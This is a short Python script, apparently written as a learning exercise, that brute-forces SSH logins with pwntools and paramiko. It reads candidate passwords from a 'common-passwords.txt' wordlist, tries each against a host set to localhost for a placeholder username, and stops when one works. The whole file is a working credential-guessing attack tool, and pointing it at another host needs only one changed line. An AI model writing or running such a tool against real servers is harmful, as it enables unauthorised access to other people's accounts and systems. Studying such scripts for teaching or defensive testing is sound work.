from pwn import *
import paramiko

host = "127.0.0.1" #localhost for testing purposes
username = "username" 
attempts = 0 #attempt variable to count how many attempts has been made

#using file open function to access the passworld wordlist in the same directory the python script is in
with open("common-passwords.txt", "r") as passwordlist:
	for password in passwordlist:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password = password, timeout=10)
			if response.connected():
				print("[>] Valid password found: '{}".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!!")
		attempts+=1
